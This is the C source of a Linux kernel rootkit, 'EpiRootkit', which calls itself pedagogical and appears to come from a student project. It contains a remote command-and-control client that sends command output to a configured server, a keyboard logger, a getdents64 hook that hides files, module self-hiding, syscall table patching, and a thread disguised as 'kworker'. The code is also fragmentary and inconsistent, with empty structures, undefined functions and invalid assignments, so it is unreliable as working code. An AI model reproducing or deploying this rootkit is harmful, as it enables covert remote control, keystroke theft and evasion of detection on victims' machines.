#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>
#include <linux/jiffies.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.1");

struct rootkit_config {
    int port;
    const char *server_ip;
    int buffer_size;
    const char *xor_key;
    const char *temp_output_file;
    const char *command_prefix_auth;
    const char *command_prefix_exec;
    const char *command_prefix_upload;
    const char *command_prefix_download;
    const char *command_prefix_keylog;
    int command_prefix_length;
    const char *shell_path;
    const char *shell_args;
    const char *path_env;
    const char *hidden_dir;
    int max_hidden_lines;
    const char *command_prefix_hide_line;
    const char *command_prefix_unhide_line;
};

static struct network_manager net_manager = {
};

static int establish_connection(void) {
    struct sockaddr_in server_addr;
    int ret;
    unsigned long flags;
    
    spin_lock_irqsave(&net_manager.lock, flags);
    
    if (net_manager.is_connected) {
        spin_unlock_irqrestore(&net_manager.lock, flags);
        return 0;
    }
    
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &net_manager.connection);
    if (ret < 0) {
        spin_unlock_irqrestore(&net_manager.lock, flags);
        return ret;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(config.port);
    in4_pton(config.server_ip, -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);
    
    ret = kernel_connect(net_manager.connection, (struct sockaddr *)&server_addr,
                        sizeof(server_addr), 0);
    if (ret < 0) {
        sock_release(net_manager.connection);
        net_manager.connection = NULL;
    } else {
        net_manager.is_connected = true;
        g_connection_socket = net_manager.connection;
    }
    
    spin_unlock_irqrestore(&net_manager.lock, flags);
    return ret;
}

struct keylog_entry {
    char key;
    unsigned long timestamp;
};

struct keylog_buffer {
    struct keylog_entry entries[keylog_config.buffer_size];
    unsigned int head;
    unsigned int tail;
    spinlock_t lock;
};

static struct socket *g_connection_socket = NULL;
static struct task_struct *g_rootkit_thread = NULL;
static struct task_struct *g_keylog_thread = NULL;
static bool g_is_authenticated = false;
static char g_password[256] = "epita";
static struct list_head *g_prev_module = NULL;
static struct keylog_buffer *g_keylog_buffer = NULL;

static void exec_and_send_output(const char *command) {
    struct file *output_file;
    char *output_buffer;
    int read_result;
    mm_segment_t old_fs;

    output_file = filp_open(config.temp_output_file, O_RDONLY, 0);
    if (IS_ERR(output_file)) {
        send_error(ROOTKIT_ERROR_FILE, "Failed to open output file");
        return;
    }

    output_buffer = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!output_buffer) {
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_MEMORY, "Failed to allocate output buffer");
        return;
    }

    memset(output_buffer, 0, config.buffer_size);
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    read_result = kernel_read(output_file, output_buffer, config.buffer_size - 1, &output_file->f_pos);
    set_fs(old_fs);

    if (read_result < 0) {
        kfree(output_buffer);
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_FILE, "Failed to read output file");
        return;
    }

    if (read_result > 0) {
        output_buffer[read_result] = '\0';
        send_data(output_buffer);
    } else {
        send_data("Command executed with no output.\n");
    }

    filp_close(output_file, NULL);
    kfree(output_buffer);
}

static int rootkit_thread(void *data) {
    char *recv_buf;
    struct kvec iov;
    struct msghdr msg = { .msg_flags = 0 };
    int len;

    recv_buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!recv_buf)
        return -ENOMEM;

    while (!kthread_should_stop()) {
        memset(recv_buf, 0, config.buffer_size);
        iov.iov_base = recv_buf;
        iov.iov_len = config.buffer_size - 1;

        len = kernel_recvmsg(net_manager.connection, &msg, &iov, 1,
                             config.buffer_size - 1, 0);
        if (len <= 0)
            break;

        apply_xor_cipher(recv_buf, len);
        recv_buf[len] = '\0';
        process_command(recv_buf);
        msleep(100);
    }

    kfree(recv_buf);
    return 0;
}

static int connect_to_server(void) {
    struct sockaddr_in addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
                           &g_connection_socket);
    if (ret < 0)
        return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(config.port);
    addr.sin_addr.s_addr = in_aton(config.server_ip);

    return g_connection_socket->ops->connect(g_connection_socket,
                                             (struct sockaddr *)&addr,
                                             sizeof(addr), 0);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct linux_dirent64 *current_dir, *dirent_ker = NULL;

    if (ret <= 0)
        return ret;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (dirent_ker == NULL)
        return ret;

    if (copy_from_user(dirent_ker, dirent, ret))
        goto done;

    for (off = 0; off < ret;) {
        dir = (void *)dirent_ker + off;
        if (strstr(dir->d_name, config.hidden_dir)) {
            if (dir == dirent_ker) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            if (dir == dirent_ker + ret - dir->d_reclen) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            if (prev) {
                prev->d_reclen = dir->d_reclen;
                prev->d_name = dir->d_name;
            }
            prev = dir;
        }
        off += dir->d_reclen;
    }

done:
    if (copy_to_user(dirent, dirent_ker, ret))
        ret = -EFAULT;
    kfree(dirent_ker);
    return ret;
}

static int __init epirootkit_init(void) {
    g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
    if (IS_ERR(g_keylog_thread)) {
        g_keylog_thread = NULL;
    }
    
    g_stealth_thread = kthread_run(stealth_thread, NULL, "kworker/%d", 0);
    if (IS_ERR(g_stealth_thread)) {
        free_secure_memory(mem_manager.nonpaged_memory);
        return PTR_ERR(g_stealth_thread);
    }
    
    return 0;
}

static void __exit epirootkit_exit(void) {
    if (net_manager.thread)
        kthread_stop(net_manager.thread);
    if (g_keylog_thread)
        kthread_stop(g_keylog_thread);
    if (g_stealth_thread)
        kthread_stop(g_stealth_thread);
    
    if (net_manager.connection) {
        sock_release(net_manager.connection);
        net_manager.connection = NULL;
        g_connection_socket = NULL;
    }
    
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;
    sys_call_table[__NR_write] = (unsigned long)original_write;
    
    unhide_module();
    
    keylog_buffer_cleanup();
    
    if (mem_manager.nonpaged_memory) {
        free_secure_memory(mem_manager.nonpaged_memory);
    }
    
    struct dkom_entry *entry, *tmp;
    unsigned long flags;
    spin_lock_irqsave(&dkom_lock, flags);
    list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
        dkom_restore_object(entry->object);
    }
    spin_unlock_irqrestore(&dkom_lock, flags);
    
    struct hook_entry *hook_entry, *hook_tmp;
    spin_lock_irqsave(&hook_lock, flags);
    list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
        remove_hook(hook_entry->target);
    }
    spin_unlock_irqrestore(&hook_lock, flags);
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);